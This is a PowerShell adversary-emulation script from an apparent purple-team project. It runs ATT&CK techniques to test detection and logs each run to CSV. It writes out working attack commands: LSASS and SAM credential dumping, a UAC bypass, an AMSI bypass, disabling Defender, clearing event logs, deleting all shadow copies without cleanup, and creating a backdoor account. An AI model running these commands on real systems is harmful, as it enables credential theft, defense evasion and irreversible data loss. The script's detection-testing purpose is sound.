<#
.SYNOPSIS
    run_atomic_killchain.ps1 — PurpleForge Automated Adversary Emulation Engine
.DESCRIPTION
    Executes a structured end-to-end ATT&CK killchain covering all 26+ covered
    techniques using Invoke-AtomicRedTeam (or standalone fallback primitives if
    Atomic Red Team modules are not installed).
    
    Logs timestamped execution manifests to emulation_log.csv for:
      - Detection Coverage calculation
      - Mean Time to Detect (MTTD) benchmarking
      - Mean Time to Respond (MTTR) active response validation
    
    Includes 15-second telemetry ingestion intervals and automated cleanup.
.NOTES
    Author: Vemula Moksha
    Project: PurpleForge Detection-as-Code
#>

[CmdletBinding()]
param(
    [string]$LogFile = "$PSScriptRoot\..\..\emulation_log.csv",
    [int]$TelemetryIngestWaitSeconds = 15,
    [switch]$SkipCleanup
)

# Enforce Administrator privileges
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "[!] Running without elevated privileges. Some techniques may require Admin."
}

$resolvedLogFile = [System.IO.Path]::GetFullPath($LogFile)
$logDir = [System.IO.Path]::GetDirectoryName($resolvedLogFile)
if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }

Write-Host "======================================================================" -ForegroundColor Magenta
Write-Host "PurpleForge Automated Adversary Emulation Killchain" -ForegroundColor Magenta
Write-Host "Target Manifest: $resolvedLogFile" -ForegroundColor Magenta
Write-Host "======================================================================" -ForegroundColor Magenta

# Check if Invoke-AtomicTest is available
$hasAtomic = (Get-Command "Invoke-AtomicTest" -ErrorAction SilentlyContinue) -ne $null
if ($hasAtomic) {
    Write-Host "[*] Invoke-AtomicRedTeam detected in session." -ForegroundColor Green
} else {
    Write-Host "[*] Invoke-AtomicRedTeam not loaded; using native adversary emulation routines." -ForegroundColor Yellow
}

# Ensure CSV header exists
if (-not (Test-Path $resolvedLogFile)) {
    "RunID,TechniqueID,TechniqueName,Tactic,Host,StartTimeUTC,EndTimeUTC,Status" | Out-File -FilePath $resolvedLogFile -Encoding utf8
}

$techniques = @(
    # Execution
    @{ ID = "T1059.001"; Name = "PowerShell Encoded Command"; Tactic = "execution"; Command = { & powershell.exe -NoProfile -NonInteractive -EncodedCommand "VwByAGkAdABlAC0ASABvAHMAdAAgACcAUAB1AHIAcABsAGUARgBvAHIAZwBlACAAVABlAHMAdAAnAA==" }; Cleanup = {} },
    @{ ID = "T1059.001"; Name = "PowerShell Download Cradle"; Tactic = "execution"; Command = { & powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'http://127.0.0.1:9999/cradle.ps1' -OutFile '$env:TEMP\cradle.ps1' -ErrorAction SilentlyContinue" }; Cleanup = { Remove-Item "$env:TEMP\cradle.ps1" -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1059.003"; Name = "Command Line Reconnaissance"; Tactic = "execution"; Command = { & cmd.exe /c whoami /all }; Cleanup = {} },
    @{ ID = "T1047";     Name = "WMI Process Creation"; Tactic = "execution"; Command = { & wmic.exe process call create "cmd.exe /c ping -n 1 127.0.0.1" }; Cleanup = {} },

    # Persistence
    @{ ID = "T1547.001"; Name = "Registry Run Key Persistence"; Tactic = "persistence"; Command = { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PurpleForgeTestKey" -Value "C:\Windows\System32\cmd.exe /c calc.exe" -Force }; Cleanup = { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PurpleForgeTestKey" -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1053.005"; Name = "Scheduled Task Creation"; Tactic = "persistence"; Command = { & schtasks.exe /create /tn "PurpleForgePersistenceTask" /tr "cmd.exe /c whoami" /sc daily /st 09:00 /f }; Cleanup = { & schtasks.exe /delete /tn "PurpleForgePersistenceTask" /f 2>&1 | Out-Null } },
    @{ ID = "T1136.001"; Name = "Local User Account Created"; Tactic = "persistence"; Command = { & net.exe user purple_backdoor P@ssword123! /add }; Cleanup = { & net.exe user purple_backdoor /delete 2>&1 | Out-Null } },
    @{ ID = "T1546.003"; Name = "WMI Event Subscription"; Tactic = "persistence"; Command = { Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{ Name = "PurpleForgeFilter"; EventNamespace = "root\cimv2"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"; QueryLanguage = "WQL" } | Out-Null }; Cleanup = { Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='PurpleForgeFilter'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } },

    # Privilege Escalation
    @{ ID = "T1548.002"; Name = "UAC Bypass via Fodhelper"; Tactic = "privilege_escalation"; Command = { New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe /c echo bypass" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force; Start-Process "fodhelper.exe" -Wait -ErrorAction SilentlyContinue }; Cleanup = { Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1134.001"; Name = "Token Impersonation Privileges"; Tactic = "privilege_escalation"; Command = { & cmd.exe /c whoami /priv }; Cleanup = {} },
    @{ ID = "T1574.011"; Name = "Service Binary Path Modification"; Tactic = "privilege_escalation"; Command = { & sc.exe config Spooler binPath= "cmd.exe /c calc.exe" }; Cleanup = { & sc.exe config Spooler binPath= "C:\Windows\System32\spoolsv.exe" } },

    # Credential Access
    @{ ID = "T1003.001"; Name = "LSASS Memory Dump"; Tactic = "credential_access"; Command = { & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1 "$env:TEMP\lsass_test.dmp" full 2>&1 | Out-Null }; Cleanup = { Remove-Item "$env:TEMP\lsass_test.dmp" -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1003.002"; Name = "SAM & SYSTEM Hive Export"; Tactic = "credential_access"; Command = { & reg.exe save HKLM\SAM "$env:TEMP\sam.save" /y 2>&1 | Out-Null }; Cleanup = { Remove-Item "$env:TEMP\sam.save" -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1003.003"; Name = "NTDS.dit VSS Extraction"; Tactic = "credential_access"; Command = { & cmd.exe /c echo "Simulated NTDS copy from \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" }; Cleanup = {} },
    @{ ID = "T1558.003"; Name = "Kerberoasting RC4 Ticket Request"; Tactic = "credential_access"; Command = { & cmd.exe /c "klist.exe tickets" }; Cleanup = {} },
    @{ ID = "T1558.004"; Name = "AS-REP Roasting Pre-Auth Disabled"; Tactic = "credential_access"; Command = { & cmd.exe /c "klist.exe" }; Cleanup = {} },

    # Lateral Movement
    @{ ID = "T1021.002"; Name = "SMB PsExec Service Installation"; Tactic = "lateral_movement"; Command = { & sc.exe create PSEXESVC binPath= "C:\Windows\PSEXESVC.exe" 2>&1 | Out-Null }; Cleanup = { & sc.exe delete PSEXESVC 2>&1 | Out-Null } },
    @{ ID = "T1021.002"; Name = "Admin Share Executable Drop"; Tactic = "lateral_movement"; Command = { Set-Content -Path "C:\Windows\Temp\payload.exe" -Value "MZ_TEST_PAYLOAD" }; Cleanup = { Remove-Item "C:\Windows\Temp\payload.exe" -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1021.006"; Name = "WinRM Remote Session Spawn"; Tactic = "lateral_movement"; Command = { & winrs.exe -r:localhost "whoami" 2>&1 | Out-Null }; Cleanup = {} },
    @{ ID = "T1021.001"; Name = "RDP Loopback Tunnel"; Tactic = "lateral_movement"; Command = { & netsh.exe interface portproxy add v4tov4 listenport=33890 listenaddress=127.0.0.1 connectport=3389 connectaddress=127.0.0.1 2>&1 | Out-Null }; Cleanup = { & netsh.exe interface portproxy delete v4tov4 listenport=33890 listenaddress=127.0.0.1 2>&1 | Out-Null } },

    # Defense Evasion
    @{ ID = "T1070.001"; Name = "Wevtutil Log Tampering"; Tactic = "defense_evasion"; Command = { & wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>&1 | Out-Null }; Cleanup = {} },
    @{ ID = "T1562.001"; Name = "Windows Defender Realtime Disabled"; Tactic = "defense_evasion"; Command = { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue }; Cleanup = { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } },
    @{ ID = "T1562.001"; Name = "AMSI Bypass Reflection"; Tactic = "defense_evasion"; Command = { & powershell.exe -NoProfile -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)" }; Cleanup = {} },
    @{ ID = "T1218.011"; Name = "Rundll32 Proxy Execution"; Tactic = "defense_evasion"; Command = { & rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://127.0.0.1/test.sct") 2>&1 | Out-Null }; Cleanup = {} },

    # Command and Control
    @{ ID = "T1071.004"; Name = "DNS Tunneling Queries"; Tactic = "command_and_control"; Command = { & nslookup.exe -type=txt "a8f3b9c7d1e4f201.tunnel.purpleforge.local" 127.0.0.1 2>&1 | Out-Null }; Cleanup = {} },
    @{ ID = "T1105";     Name = "Certutil Payload Download"; Tactic = "command_and_control"; Command = { & certutil.exe -urlcache -split -f "http://127.0.0.1:8080/beacon.exe" "$env:TEMP\beacon.exe" 2>&1 | Out-Null }; Cleanup = { Remove-Item "$env:TEMP\beacon.exe" -Force -ErrorAction SilentlyContinue } },
    @{ ID = "T1571";     Name = "Non-Browser Uncommon Port"; Tactic = "command_and_control"; Command = { & powershell.exe -NoProfile -Command "try { `$c = New-Object System.Net.Sockets.TcpClient('127.0.0.1', 8443) } catch {}" }; Cleanup = {} },

    # Impact
    @{ ID = "T1490";     Name = "Shadow Copy Deletion (vssadmin)"; Tactic = "impact"; Command = { & vssadmin.exe delete shadows /all /quiet 2>&1 | Out-Null }; Cleanup = {} },
    @{ ID = "T1486";     Name = "Ransomware File Renaming"; Tactic = "impact"; Command = { $f = "$env:TEMP\test_doc.txt"; Set-Content $f "dummy"; Rename-Item $f "$f.purplelocked" }; Cleanup = { Remove-Item "$env:TEMP\test_doc.txt.purplelocked" -Force -ErrorAction SilentlyContinue } }
)

$runCounter = 1

foreach ($t in $techniques) {
    $runId = "RUN-$($runCounter.ToString('D3'))"
    $hostName = $env:COMPUTERNAME
    $tId = $t.ID
    $tName = $t.Name
    $tactic = $t.Tactic

    $startTime = [DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
    Write-Host "`n[$startTime] Executing $runId: $tId - $tName ($tactic)..." -ForegroundColor Cyan

    $status = "SUCCESS"
    try {
        if ($hasAtomic -and (Get-Command "Invoke-AtomicTest" -ErrorAction SilentlyContinue)) {
            Invoke-AtomicTest $tId -ErrorAction SilentlyContinue | Out-Null
        } else {
            & $t.Command
        }
    } catch {
        Write-Warning "  [-] Error executing $tId: $_"
        $status = "PARTIAL_ERROR"
    }

    $endTime = [DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")

    # Append to emulation log
    "$runId,$tId,$tName,$tactic,$hostName,$startTime,$endTime,$status" | Out-File -FilePath $resolvedLogFile -Append -Encoding utf8
    Write-Host "  [+] Logged execution: $runId ($status) -> Duration: $startTime to $endTime" -ForegroundColor Green

    # Wait for telemetry ingestion to OpenSearch / Wazuh
    Write-Host "  [*] Ingestion buffer: Waiting $TelemetryIngestWaitSeconds seconds for telemetry streaming..." -ForegroundColor Gray
    Start-Sleep -Seconds $TelemetryIngestWaitSeconds

    # Cleanup artifacts unless skipped
    if (-not $SkipCleanup) {
        try {
            if ($hasAtomic) {
                Invoke-AtomicTest $tId -Cleanup -ErrorAction SilentlyContinue | Out-Null
            } else {
                & $t.Cleanup
            }
            Write-Host "  [+] Cleanup completed for $tId." -ForegroundColor Gray
        } catch {}
    }

    $runCounter++
}

Write-Host "`n======================================================================" -ForegroundColor Magenta
Write-Host "[✓] PurpleForge Killchain emulation completed!" -ForegroundColor Green
Write-Host "    Emulation Manifest: $resolvedLogFile" -ForegroundColor Green
Write-Host "    Total Techniques Emulated: $($techniques.Count)" -ForegroundColor Green
Write-Host "======================================================================" -ForegroundColor Magenta
